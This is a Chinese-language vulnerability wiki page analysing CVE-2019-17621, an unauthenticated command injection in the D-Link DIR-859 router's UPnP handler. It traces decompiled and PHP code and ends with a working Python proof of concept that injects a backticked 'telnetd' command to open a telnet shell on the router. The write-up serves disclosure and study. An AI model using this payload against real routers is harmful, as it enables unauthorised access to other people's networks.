<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/D-Link/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>D-Link DIR-859 —未经身份验证的RCE(CVE-2019–17621) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "D-Link DIR-859 \u2014\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684RCE(CVE-2019\u201317621)", url: "#_top", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019%E2%80%9320213%EF%BC%89D-Link%20DIR-859%20rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019%E2%80%9320213%EF%BC%89D-Link%20DIR-859%20rce/" class="btn btn-xs btn-link">
        （CVE 2019–20213）D Link DIR 859 rce
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-7298%EF%BC%89D-Link%20DIR-823G%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-7298%EF%BC%89D-Link%20DIR-823G%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE 2019 7298）D Link DIR 823G 命令注入漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="d-link-dir-859-rcecve-201917621">D-Link DIR-859 —未经身份验证的RCE(CVE-2019–17621)<a class="headerlink" href="#d-link-dir-859-rcecve-201917621" title="Permanent link">&para;</a></h1>
<p><strong>研究人员</strong>
Miguel Mendez Z.-（s1kr10s）
Pablo Pollanco-（secenv）
<strong>技术细节</strong>
型号：DIR-859
固件版本：1.06b01 Beta01，1.05
架构：MIPS 32位
<strong>脆弱性</strong>
远程执行代码（未经身份验证，LAN）
受影响的产品
<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191231194644-37bf165e-2bc3-1.png"><img alt="img" src="../resource/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/media/20191231194644-37bf165e-2bc3-1.png" /></a>
<strong>漏洞分析</strong>
在用于管理UPnP请求的代码中发现了远程执行代码漏洞。下面我们将简要描述UPnP协议。
<strong>什么是UPnP？</strong>
UPnP是专用网络中设备之间的通信协议。它的主要功能之一是自动自动打开端口，而无需用户为每个程序手动配置路由器。它在用于视频游戏的系统中特别有用，因为它是动态工作的，而且正如我们之前所说的，它是自主的。
回到分析，我们粗略地显示了二进制可执行文件/ htdocs / cgibin（固件文件DIR859Ax_FW106b01_beta01.bin和DIR859Ax_FW105b03.bin）中的genacgi_main（）函数，该漏洞包含使我们能够执行代码的漏洞，并且达到下图所示的代码所必须满足的条件。</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191231194805-67eeb0d2-2bc3-1.png"><img alt="img" src="../resource/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/media/20191231194805-67eeb0d2-2bc3-1.png" /></a></p>
<p>如下所示，sprintf（）设置了一个包含所有值的缓冲区，包括带有值的参数“？service = *”，这就是我们将在此处跟踪的内容。
<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191231194750-5f4f8afa-2bc3-1.png"><img alt="img" src="../resource/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/media/20191231194750-5f4f8afa-2bc3-1.png" /></a>
为了更好地了解漏洞的发生方式，我们在下面显示genacgi_main（）函数的反编译伪代码的一部分（为清楚起见，修改了变量名）。</p>
<div class="highlight"><pre><span></span><code>/* The method has to be SUBSCRIBE to reach the buggy code */
metodo = getenv(&quot;REQUEST_METHOD”);
request_uri = getenv(&quot;REQUEST_URI”);
request_uri_0x3f = strchr(request_uri,0x3f);
cmp_service = strncmp(request_uri_0x3f,&quot;?service=&quot;,9)
if (cmp_service != 0) {
     return -1; 
}
/* more code */
valor_subscribe = strcasecmp(metodo,&quot;SUBSCRIBE&quot;);
request_uri_0x3f = request_uri_0x3f + 9;
if (valor_subscribe != 0) {
     /* more code */
}
server_id_3 = getenv(&quot;SERVER_ID&quot;);
http_sid_2 = getenv(&quot;HTTP_SID&quot;);
http_callback_2 = getenv(&quot;HTTP_CALLBACK&quot;);
http_timeout = getenv(&quot;HTTP_TIMEOUT&quot;);
http_nt_2 = getenv(&quot;HTTP_NT&quot;);
remote_addr = getenv(&quot;REMOTE_ADDR”);
/* more code */
if (cmp_http_callback == 0) {
     /* more code */
str_http_callback_0x2f = strchr(http_callback_2 + 7, 0x2f);
          if (str_http_callback_0x2f != (char *)0x0) {
               get_pid_1 = getpid();
/* vulnerable code */
               sprintf(buffer_8,&quot;%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh&quot;, &quot;/htdocs/upnp/run.NOTIFY.php&quot;, server_id_3, request_uri_0x3f, http_callback_2 + 7, str_http_callback_0x2f + 1, flag_2, remote_addr, &quot;/var/run&quot;, request_uri_0x3f, get_pid_1);
/* send the data */
               xmldbc_ephp(0,0,buffer_8,(int)stdout);
}
/* more code */
</code></pre></div>
<p>然后，使用xmldbc_ephp（）（最终调用send（））将“ buffer_8”中包含的数据发送到PHP。</p>
<div class="highlight"><pre><span></span><code>int xmldbc_ephp(int 0,int 0_,char *buffer_8,int stdout)
{
     size_t len_buffer;
     int ret_prepre;
     len_buffer = strlen(buffer_8);
     len_buffer._2_2_ = (short)len_buffer;
     ret_prepre = [send(socket,buffer_8,(uint)len_buffer,0x4000);]
     return ret_prepre;
}
</code></pre></div>
<p>如代码所示，URL是从环境变量“ REQUEST_URI”获得的，然后按以下方式验证其结构：</p>
<div class="highlight"><pre><span></span><code>request_uri = &quot;http://IP:PORT/*?service=file_name&quot;
request_uri_0x3f = strchr(request_uri,0x3f);
————strchr()———— + 9 ———— we control the filename with the variable =&gt; request_uri_0x3f
</code></pre></div>
<p>通过调用strchr（）和strncmp（），代码检查是否存在值“ 0x3f”（=字符“？”）和字符串“？service = <em>”；之后，它将验证请求方法：如果调用SUBSCRIBE，则代码会将9个字节的偏移量添加到request_uri_0x3f指针，并将其放置在文件名所在的位置。初始化其他一些变量，最后使用sprintf（）连接许多变量的值，填充一个缓冲区，该缓冲区设置要传递的新变量，其中“ SHELL*FILE”以格式字符串“％s</em>％d.sh”传递”，用于为新的Shell脚本命名。
将数据复制到“ buffer_8”缓冲区后，将在内存中进行如下设置：
<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191231195025-bb799abe-2bc3-1.png"><img alt="img" src="../resource/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/media/20191231195025-bb799abe-2bc3-1.png" /></a>
缓冲区中包含的数据现在由PHP文件“ run.NOTIFY.php”处理，在此再次验证请求方法。
文件：run.NOTIFY.php</p>
<div class="highlight"><pre><span></span><code>$gena_path = XNODE_getpathbytarget($G_GENA_NODEBASE, &quot;inf&quot;, &quot;uid&quot;, $INF_UID, 1);
$gena_path = $gena_path.&quot;/&quot;.$SERVICE;
GENA_subscribe_cleanup($gena_path);
/* IGD services */
if ($SERVICE == &quot;L3Forwarding1&quot;) 
$php = &quot;NOTIFY.Layer3Forwarding.1.php&quot;;
else if ($SERVICE == &quot;OSInfo1&quot;)            
$php = &quot;NOTIFY.OSInfo.1.php&quot;;
else if ($SERVICE == &quot;WANCommonIFC1&quot;)      
$php = &quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;;
else if ($SERVICE == &quot;WANEthLinkC1&quot;)       
$php = &quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;;
else if ($SERVICE == &quot;WANIPConn1&quot;)         
$php = &quot;NOTIFY.WANIPConnection.1.php&quot;;
/* WFA services */
else if ($SERVICE == &quot;WFAWLANConfig1&quot;)
$php = &quot;NOTIFY.WFAWLANConfig.1.php&quot;;
if ($METHOD == &quot;SUBSCRIBE&quot;)
{
   if ($SID == &quot;&quot;)
      GENA_subscribe_new($gena_path, $HOST, $REMOTE, $URI, $TIMEOUT, $SHELL_FILE, &quot;/htdocs/upnp/&quot;.$php, $INF_UID);
   else
      GENA_subscribe_sid($gena_path, $SID,  $TIMEOUT);
}
else if ($METHOD == &quot;UNSUBSCRIBE&quot;)
{
   GENA_unsubscribe($gena_path, $SID);
}
</code></pre></div>
<p>该脚本调用PHP函数“ GENA_subscribe_new（）”，并向其传递在cgibin程序的genacgi_main（）函数中获得的变量，包括“ SHELL_FILE”变量。如前面的genacgi_main（）代码所示，此变量用于设置文件名的一部分。
文件：gena.php，函数GENA_subscribe_new（）</p>
<div class="highlight"><pre><span></span><code>function GENA_subscribe_new($node_base, $host, $remote, $uri, $timeout, $shell_file, $target_php, $inf_uid)
{
   anchor($node_base);
   $count = query(&quot;subscription#&quot;);
   $found = 0;
/* find subscription index &amp; uuid */
   foreach (&quot;subscription&quot;)
   {
      if (query(&quot;host&quot;)==$host &amp;&amp; query(&quot;uri&quot;)==$uri)
      {
         $found = $InDeX; break;
      }
   }
if ($found == 0)
   {
      $index = $count + 1;
      $new_uuid = &quot;uuid:&quot;.query(&quot;/runtime/genuuid&quot;);
   } else {
      $index = $found;
      $new_uuid = query(&quot;subscription:&quot;.$index.&quot;/uuid&quot;);
   }
/* get timeout */
   if ($timeout==0 || $timeout==&quot;&quot;) {
      $timeout = 0; $new_timeout = 0;
   } else {
      $new_timeout = query(&quot;/runtime/device/uptime&quot;) + $timeout;
   }
/* set to nodes */
   set(&quot;subscription:&quot;.$index.&quot;/remote&quot;,    $remote);
   set(&quot;subscription:&quot;.$index.&quot;/uuid&quot;,        $new_uuid);
   set(&quot;subscription:&quot;.$index.&quot;/host&quot;,        $host);
   set(&quot;subscription:&quot;.$index.&quot;/uri&quot;,        $uri);
   set(&quot;subscription:&quot;.$index.&quot;/timeout&quot;,    $new_timeout);
   set(&quot;subscription:&quot;.$index.&quot;/seq&quot;, &quot;1&quot;);
   GENA_subscribe_http_resp($new_uuid, $timeout);
   GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $new_uuid);
}
如我们所见，“ GENA_subscribe_new（）”函数不会修改$ shell_file变量。
我们在这里可以看到两个函数：“ GENA_subscribe_http_resp（）”，它仅加载要在UPnP响应中传递的标头；“ GENA_notify_init（）”，其接收“ $ shell_file”变量，我们一直在跟踪。
文件：gena.php，函数GENA_notify_init（）

​```cpp
function GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $sid)
{
  $inf_path = XNODE_getpathbytarget(&quot;&quot;, &quot;inf&quot;, &quot;uid&quot;, $inf_uid, 0);
  if ($inf_path==&quot;&quot;)
  {
     TRACE_debug(&quot;can&#39;t find inf_path by $inf_uid=&quot;.$inf_uid.&quot;!&quot;);
    return &quot;&quot;;
  }
  $phyinf = PHYINF_getifname(query($inf_path.&quot;/phyinf&quot;));
  if ($phyinf == &quot;&quot;)
  {
    TRACE_debug(&quot;can&#39;t get phyinf by $inf_uid=&quot;.$inf_uid.&quot;!&quot;);
    return &quot;&quot;;
  }
$upnpmsg = query(&quot;/runtime/upnpmsg&quot;);
if ($upnpmsg == &quot;&quot;) $upnpmsg = &quot;/dev/null&quot;;
fwrite(w, $shell_file,
&quot;#!/bin/sh\n&quot;.
&#39;echo &quot;[$0] ...&quot; &gt; &#39;.$upnpmsg.&quot;\n&quot;.
&quot;xmldbc -P &quot;.$target_php.
  &quot; -V INF_UID=&quot;.$inf_uid.
  &quot;-V HDR_URL=&quot;.$uri.
  &quot; -V HDR_HOST=&quot;.$host.
  &quot; -V HDR_SID=&quot;.$sid.
  &quot; -V HDR_SEQ=0&quot;.
  &quot; | httpc -i &quot;.$phyinf.&quot; -d \&quot;&quot;.$host.&quot;\&quot; -p TCP &gt; &quot;.$upnpmsg.&quot;\n&quot;
);
fwrite(a, $shell_file, &quot;rm -f &quot;.$shell_file.&quot;\n&quot;); /* Here, the code is injected as filename */
}
</code></pre></div>
<p>这是“ SHELL_FILE”最终结束的地方。它用作通过调用PHP函数“ fwrite（）”创建的新文件的名称的一部分。此函数使用了两次：第一个创建文件，从我们控制的SHELL_FILE变量中获取文件名，并连接getpid（）的输出，如下所示：</p>
<div class="highlight"><pre><span></span><code>Request: http://IP:PORT/*?service=file_name
System: /var/run/nombre_archivo_13567.sh
</code></pre></div>
<p>第二次对“ fwrite（）”的调用将向该文件添加新行，其中包含对“ rm”系统命令的调用以删除自身。
为了利用这一点，我们只需要插入一个用反引号引起的系统命令（$ command），然后将其注入到shell脚本中，并为我们提供RCE；“ rm”命令将失败，因为文件名字符串将被“ rm”返回的输出（空字符串）替换。</p>
<div class="highlight"><pre><span></span><code>Request: http://IP:PORT/*?service=`ping 192.168.0.20`
System: /var/run/`ping 192.168.0.20`_13567.sh
Run: rm -f `ping 192.168.0.20`_13467.sh
</code></pre></div>
<p>利用PoC
综上所述，我们编写了一个功能脚本来利用此RCE。</p>
<div class="highlight"><pre><span></span><code>import socket
import os
from time import sleep
# Exploit By Miguel Mendez &amp; Pablo Pollanco
def httpSUB(server, port, shell_file):
    print(&#39;\n[*] Connection {host}:{port}&#39;).format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = &quot;SUBSCRIBE /gena.cgi?service=&quot; + str(shell_file) + &quot; HTTP/1.0\n&quot;
    request += &quot;Host: &quot; + str(server) + str(port) + &quot;\n&quot;
    request += &quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;
    request += &quot;NT: upnp:event\n&quot;
    request += &quot;Timeout: Second-1800\n&quot;
    request += &quot;Accept-Encoding: gzip, deflate\n&quot;
    request += &quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;
sleep(1)
    print(&#39;[*] Sending Payload&#39;)
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)
sleep(1)
    print(&#39;[*] Running Telnetd Service&#39;)
    sleep(1)
    print(&#39;[*] Opening Telnet Connection\n&#39;)
    sleep(2)
    os.system(&#39;telnet &#39; + str(server) + &#39; 9999&#39;)
serverInput = raw_input(&#39;IP Router: &#39;)
portInput = 49152
httpSUB(serverInput, portInput, &#39;`telnetd -p 9999 &amp;`&#39;)
</code></pre></div>
<p>借助此漏洞，我们接下来可以启动telnet服务以维持访问权限。Boom！
<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191231195458-5e5304fa-2bc4-1.png"><img alt="img" src="../resource/%EF%BC%88CVE-2019%E2%80%9317621%EF%BC%89D-Link%20DIR-859%20rce/media/20191231195458-5e5304fa-2bc4-1.png" /></a>
视频
<a href="https://youtu.be/Q1HC5ExoE30">https://youtu.be/Q1HC5ExoE30</a>
分析和利用：<a href="https://github.com/s1kr10s/D-Link-DIR-859-RCE">路由器D-LINK RCE</a></p>
<p>原文地址：<a href="https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104">https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019%E2%80%9320213%EF%BC%89D-Link%20DIR-859%20rce/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019%E2%80%9320213%EF%BC%89D-Link%20DIR-859%20rce/" class="btn btn-xs btn-link">
        （CVE 2019–20213）D Link DIR 859 rce
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-7298%EF%BC%89D-Link%20DIR-823G%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-7298%EF%BC%89D-Link%20DIR-823G%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE 2019 7298）D Link DIR 823G 命令注入漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>